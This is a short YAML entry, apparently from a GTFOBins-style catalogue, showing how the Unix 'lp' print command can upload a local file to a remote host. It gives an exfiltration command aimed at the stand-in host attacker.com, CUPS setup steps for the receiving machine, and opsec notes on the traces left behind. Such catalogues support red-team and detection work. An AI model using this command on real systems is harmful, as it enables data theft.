---
name: lp
capabilities:
- upload
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: false
examples:
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: lp /path/to/input-file -h attacker.com
  notes: |-
    This requires `cups` to be installed. Run the following on the attacker box beforehand:

    1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
    2. `lpadmin -d printer` to set the new printer as default;
    3. `cupsctl --remote-any` to enable printing from the Internet.
references:
- https://gtfobins.github.io/gtfobins/lp/
tags: []
---
